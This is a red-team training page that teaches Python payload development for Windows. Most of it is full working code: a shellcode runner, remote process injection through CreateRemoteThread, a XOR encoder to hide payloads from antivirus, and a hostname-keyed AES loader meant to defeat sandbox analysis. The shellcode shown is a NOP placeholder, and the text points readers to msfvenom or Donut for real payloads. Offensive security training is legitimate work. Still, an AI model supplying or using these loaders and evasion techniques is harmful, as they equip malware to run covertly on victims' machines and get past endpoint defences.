---
layout: training-page
title: "Python Payload Development — Red Team Academy"
module: "Tool Development"
tags:
  - python
  - payload
  - shellcode
  - ctypes
  - process-injection
  - obfuscation
page_key: "tooldev-python-payload-dev"
render_with_liquid: false
---

# Python Payload Development

## Overview

Python's `ctypes` library provides direct access to the Windows API from a Python script, enabling shellcode injection, process manipulation, and DLL loading without a compiled binary. This module covers the full payload development lifecycle: generating shellcode, obfuscating it at rest, running it in the current process, injecting it into a remote process, and staging it from a remote server. These primitives are the foundation of Python-based loaders and droppers.

All code targets Windows (x64). **Dependencies:** `pip install pycryptodome` for AES helpers. The ctypes payloads use no external packages.

## Shellcode Runner (Local Process)

Allocates a region of executable memory in the current Python process using `VirtualAlloc`, copies shellcode bytes into it, and transfers execution via a C function pointer cast. This is the simplest shellcode delivery mechanism — the shellcode runs inside `python.exe`.

```
#!/usr/bin/env python3
"""
shellcode_runner.py — Execute shellcode in the current process via ctypes.
Technique:
  1. VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     — allocates a single RWX memory region (simplest but flagged by some EDRs)
  2. ctypes.memmove — copies shellcode bytes into the allocated buffer
  3. Cast the buffer pointer to a C function pointer (CFUNCTYPE) and call it

For better evasion, allocate RW first, copy shellcode, then VirtualProtect to RX.
This module shows both approaches.
"""

import ctypes
import ctypes.wintypes

# ── Windows API declarations ──────────────────────────────────────────────────
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect) -> LPVOID
kernel32.VirtualAlloc.restype  = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p,       # lpAddress  (NULL = let OS choose)
    ctypes.c_size_t,       # dwSize
    ctypes.wintypes.DWORD, # flAllocationType
    ctypes.wintypes.DWORD, # flProtect
]

# VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect) -> BOOL
kernel32.VirtualProtect.restype  = ctypes.wintypes.BOOL
kernel32.VirtualProtect.argtypes = [
    ctypes.c_void_p,
    ctypes.c_size_t,
    ctypes.wintypes.DWORD,
    ctypes.POINTER(ctypes.wintypes.DWORD),
]

# ── Memory protection constants ───────────────────────────────────────────────
MEM_COMMIT   = 0x00001000
MEM_RESERVE  = 0x00002000
PAGE_RW      = 0x04    # PAGE_READWRITE
PAGE_RX      = 0x20    # PAGE_EXECUTE_READ
PAGE_RWX     = 0x40    # PAGE_EXECUTE_READWRITE

# ── Placeholder shellcode — replace with msfvenom/Donut/custom payload ────────
# Example: msfvenom -p windows/x64/exec CMD=calc.exe -f python -v shellcode
# shellcode = b"\xfc\x48\x83\xe4\xf0..."
shellcode = b"\x90" * 16  # NOP sled placeholder — will not do anything useful

def run_shellcode_rwx(shellcode: bytes) -> None:
    """
    Approach 1 (noisy): allocate RWX in one step, copy shellcode, execute.
    Many EDRs flag PAGE_EXECUTE_READWRITE allocations immediately.
    """
    size = len(shellcode)
    buf  = kernel32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_RWX)
    if not buf:
        raise ctypes.WinError(ctypes.get_last_error())

    # Copy shellcode bytes into the executable buffer
    ctypes.memmove(buf, shellcode, size)

    # Cast buffer to a callable C function pointer with no args/return value
    fn = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    fn()    # Transfer execution to shellcode

def run_shellcode_rw_then_rx(shellcode: bytes) -> None:
    """
    Approach 2 (stealthier): allocate RW, copy shellcode, change to RX, execute.
    Separating write and execute phases reduces EDR RWX allocation alerts.
    """
    size     = len(shellcode)
    old_prot = ctypes.wintypes.DWORD(0)

    # Allocate RW (not executable yet)
    buf = kernel32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    if not buf:
        raise ctypes.WinError(ctypes.get_last_error())

    # Write shellcode into the non-executable RW buffer
    ctypes.memmove(buf, shellcode, size)

    # Change protection to RX — now executable but no longer writable
    if not kernel32.VirtualProtect(buf, size, PAGE_RX, ctypes.byref(old_prot)):
        raise ctypes.WinError(ctypes.get_last_error())

    fn = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    fn()

if __name__ == "__main__":
    print("[*] Executing shellcode in local process (RW→RX approach)")
    run_shellcode_rw_then_rx(shellcode)
```

## Remote Process Injection

Injects shellcode into a remote process identified by name or PID using the classic `OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread` sequence. The shellcode runs inside the target process (e.g., explorer.exe, notepad.exe), masking its origin.

```
#!/usr/bin/env python3
"""
process_inject.py — Remote process injection via ctypes Windows API.
Technique: OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

Security note: requires SeDebugPrivilege or PROCESS_ALL_ACCESS on the target.
Most user-mode processes are accessible when running as the same user.
Elevated privileges (Admin/SYSTEM) give access to nearly all processes.
"""

import ctypes
import ctypes.wintypes
import sys

# ── API declarations ──────────────────────────────────────────────────────────
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
LPVOID   = ctypes.c_void_p

kernel32.OpenProcess.restype  = ctypes.wintypes.HANDLE
kernel32.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]

kernel32.VirtualAllocEx.restype  = LPVOID
kernel32.VirtualAllocEx.argtypes = [
    ctypes.wintypes.HANDLE, LPVOID,
    ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD
]

kernel32.WriteProcessMemory.restype  = ctypes.wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    ctypes.wintypes.HANDLE, LPVOID, LPVOID,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
]

kernel32.CreateRemoteThread.restype  = ctypes.wintypes.HANDLE
kernel32.CreateRemoteThread.argtypes = [
    ctypes.wintypes.HANDLE, LPVOID, ctypes.c_size_t,
    LPVOID, LPVOID, ctypes.wintypes.DWORD,
    ctypes.POINTER(ctypes.wintypes.DWORD)
]

# ── Constants ─────────────────────────────────────────────────────────────────
PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT         = 0x00001000
MEM_RESERVE        = 0x00002000
PAGE_RW            = 0x04
PAGE_RX            = 0x20

def find_pid_by_name(process_name: str) -> int | None:
    """
    Walk the process snapshot to find a PID by process name.
    Uses CreateToolhelp32Snapshot / Process32First / Process32Next.
    """
    TH32CS_SNAPPROCESS = 0x00000002
    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize",              ctypes.wintypes.DWORD),
            ("cntUsage",            ctypes.wintypes.DWORD),
            ("th32ProcessID",       ctypes.wintypes.DWORD),
            ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID",        ctypes.wintypes.DWORD),
            ("cntThreads",          ctypes.wintypes.DWORD),
            ("th32ParentProcessID", ctypes.wintypes.DWORD),
            ("pcPriClassBase",      ctypes.c_long),
            ("dwFlags",             ctypes.wintypes.DWORD),
            ("szExeFile",           ctypes.c_char * 260),
        ]

    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if not kernel32.Process32First(snap, ctypes.byref(entry)):
        return None

    target_name = process_name.lower().encode()
    while True:
        if entry.szExeFile.lower() == target_name:
            kernel32.CloseHandle(snap)
            return entry.th32ProcessID
        if not kernel32.Process32Next(snap, ctypes.byref(entry)):
            break

    kernel32.CloseHandle(snap)
    return None

def inject(pid: int, shellcode: bytes) -> None:
    """
    Inject shellcode into the target PID.
    Steps:
      1. OpenProcess — get a handle with PROCESS_ALL_ACCESS
      2. VirtualAllocEx — allocate RW memory in the remote process
      3. WriteProcessMemory — copy shellcode bytes into the remote allocation
      4. VirtualProtectEx — change protection from RW to RX (stealthier)
      5. CreateRemoteThread — spawn a thread in the remote process at our buffer
    """
    size = len(shellcode)

    # Step 1: open target process
    proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not proc:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[*] Opened PID {pid} (handle: {proc})")

    # Step 2: allocate RW memory in the remote process (not RWX — stealthier)
    remote_buf = kernel32.VirtualAllocEx(proc, None, size, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    if not remote_buf:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[*] Remote allocation at 0x{remote_buf:016x}")

    # Step 3: copy shellcode to remote allocation
    written = ctypes.c_size_t(0)
    sc_buf  = (ctypes.c_char * size).from_buffer_copy(shellcode)
    if not kernel32.WriteProcessMemory(proc, remote_buf, sc_buf, size, ctypes.byref(written)):
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[*] Wrote {written.value} bytes to remote process")

    # Step 4: change protection to RX (no-write, executable)
    old_prot = ctypes.wintypes.DWORD(0)
    kernel32.VirtualProtectEx(proc, remote_buf, size, PAGE_RX, ctypes.byref(old_prot))

    # Step 5: create a remote thread starting at our shellcode buffer
    thread = kernel32.CreateRemoteThread(proc, None, 0, remote_buf, None, 0, None)
    if not thread:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[+] Remote thread created (TID handle: {thread}) — shellcode running in PID {pid}")

    kernel32.CloseHandle(thread)
    kernel32.CloseHandle(proc)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "notepad.exe"
    # Replace with real shellcode (msfvenom/Donut/sRDI):
    shellcode = b"\x90" * 32  # NOP placeholder

    pid = find_pid_by_name(target)
    if not pid:
        print(f"[!] Process '{target}' not found")
        sys.exit(1)

    print(f"[*] Target: {target} (PID {pid})")
    inject(pid, shellcode)
```

## XOR Payload Encoder / Decoder

Static shellcode bytes stored on disk are easily detected by AV scanners. Encoding payloads at rest with a single-byte (or multi-byte) XOR key delays detection until runtime. The decoder runs before the shellcode, XORs the bytes back to their original values, then passes control. Keep the key short and make it derived from an environmental condition (hostname, username) to thwart sandbox analysis.

```
#!/usr/bin/env python3
"""
xor_encoder.py — XOR-encode a shellcode binary for storage/transport.
Usage:
  Encode: python3 xor_encoder.py encode raw_shellcode.bin encoded.bin 0x41
  Decode: python3 xor_encoder.py decode encoded.bin raw_shellcode.bin 0x41

The encoded file format: 1 byte key + N bytes XOR'd payload.
The inline decoder (Python, for embedding in a loader) is printed after encoding.
"""

import sys
import pathlib

def xor_encode(data: bytes, key: int) -> bytes:
    """XOR every byte of data with the single-byte key."""
    return bytes(b ^ key for b in data)

def encode_file(infile: str, outfile: str, key: int) -> None:
    raw     = pathlib.Path(infile).read_bytes()
    encoded = xor_encode(raw, key)

    # Prepend the key byte so the decoder knows the key
    pathlib.Path(outfile).write_bytes(bytes([key]) + encoded)
    print(f"[+] Encoded {len(raw)} bytes → {outfile} (key=0x{key:02x})")

    # Print an inline Python decoder snippet for embedding in a loader
    print("\n[*] Inline loader snippet:")
    print(f"    key     = 0x{key:02x}")
    print( "    encoded = open('encoded.bin', 'rb').read()")
    print( "    key_b   = encoded[0]                    # key is first byte")
    print( "    sc      = bytes(b ^ key_b for b in encoded[1:])  # XOR decode")
    print( "    # sc now contains original shellcode — pass to runner")

def decode_file(infile: str, outfile: str, key: int) -> None:
    data    = pathlib.Path(infile).read_bytes()
    decoded = xor_encode(data[1:], key)   # skip key byte, XOR the rest
    pathlib.Path(outfile).write_bytes(decoded)
    print(f"[+] Decoded {len(decoded)} bytes → {outfile}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: xor_encoder.py <encode|decode> <infile> <outfile> <key_hex>")
        sys.exit(1)

    action, infile, outfile, key_str = sys.argv[1:]
    key = int(key_str, 16)

    if action == "encode":
        encode_file(infile, outfile, key)
    elif action == "decode":
        decode_file(infile, outfile, key)
    else:
        print("[!] Action must be 'encode' or 'decode'")
```

## Environment-Keyed Loader (Sandbox Evasion)

Sandboxes run payloads in generic VMs where the hostname, username, and domain are set to defaults. By deriving the decryption key from an environment property of the target (hostname hash, AD domain SID, specific registry value), the payload decrypts correctly only on the intended target and remains opaque in a generic analysis environment.

```
#!/usr/bin/env python3
"""
env_keyed_loader.py — Decrypt and execute shellcode only on the intended target.
Key derivation: HMAC-SHA256( hostname.lower(), PSK )
This means the encoded payload is unique per target machine.

Usage:
  1. On attacker: python3 env_keyed_loader.py --prepare TARGET_HOSTNAME raw_sc.bin
     → produces target_payload.bin (encrypted for that hostname only)
  2. Drop target_payload.bin on the victim; run env_keyed_loader.py --run target_payload.bin
     → decrypts using the victim's own hostname as key material
"""

import ctypes
import ctypes.wintypes
import hashlib
import hmac
import os
import pathlib
import platform
import sys
from argparse import ArgumentParser

# Shared secret — baked into the loader at compile/pack time
PSK = b"SharedOperatorSecret2026"

def derive_key(hostname: str, psk: bytes) -> bytes:
    """
    Derive a 32-byte AES key from the target's hostname using HMAC-SHA256.
    The hostname is canonicalised to lowercase to handle case variations.
    An attacker preparing the payload must know the target hostname in advance.
    """
    return hmac.new(psk, hostname.lower().encode(), hashlib.sha256).digest()

def aes_decrypt(key: bytes, data: bytes) -> bytes:
    """AES-256-CBC decrypt; first 16 bytes are the IV."""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    iv, ct = data[:16], data[16:]
    return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)

def aes_encrypt(key: bytes, plaintext: bytes) -> bytes:
    """AES-256-CBC encrypt; prepend random IV."""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    iv = os.urandom(16)
    return iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))

def prepare_payload(hostname: str, shellcode_path: str) -> None:
    """Encrypt shellcode for a specific target hostname and write to disk."""
    raw = pathlib.Path(shellcode_path).read_bytes()
    key = derive_key(hostname, PSK)
    enc = aes_encrypt(key, raw)
    outfile = f"{hostname}_payload.bin"
    pathlib.Path(outfile).write_bytes(enc)
    print(f"[+] Encrypted {len(raw)} bytes for hostname '{hostname}' → {outfile}")

def run_payload(payload_path: str) -> None:
    """
    On the victim: derive the key from THIS machine's hostname,
    decrypt the payload, and execute it in local process memory.
    If the hostname doesn't match, decryption produces garbage and will crash.
    """
    hostname = platform.node()   # victim's NetBIOS hostname
    key      = derive_key(hostname, PSK)
    enc_data = pathlib.Path(payload_path).read_bytes()

    try:
        shellcode = aes_decrypt(key, enc_data)
    except ValueError:
        # Unpad failure = wrong key = wrong hostname = wrong target
        print("[!] Decryption failed — this payload is not for this machine")
        sys.exit(1)

    print(f"[*] Decrypted {len(shellcode)} bytes — executing on {hostname}")

    # Execute in local process (same RW→RX technique as shellcode_runner.py)
    kernel32    = ctypes.WinDLL("kernel32")
    buf         = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x04)  # RW
    ctypes.memmove(buf, shellcode, len(shellcode))
    old = ctypes.wintypes.DWORD(0)
    kernel32.VirtualProtect(buf, len(shellcode), 0x20, ctypes.byref(old))   # RX
    ctypes.cast(buf, ctypes.CFUNCTYPE(None))()

if __name__ == "__main__":
    ap = ArgumentParser()
    sub = ap.add_subparsers(dest="mode")

    p_prep = sub.add_parser("prepare")
    p_prep.add_argument("hostname")
    p_prep.add_argument("shellcode")

    p_run  = sub.add_parser("run")
    p_run.add_argument("payload")

    args = ap.parse_args()
    if args.mode == "prepare":
        prepare_payload(args.hostname, args.shellcode)
    elif args.mode == "run":
        run_payload(args.payload)
    else:
        ap.print_help()
```
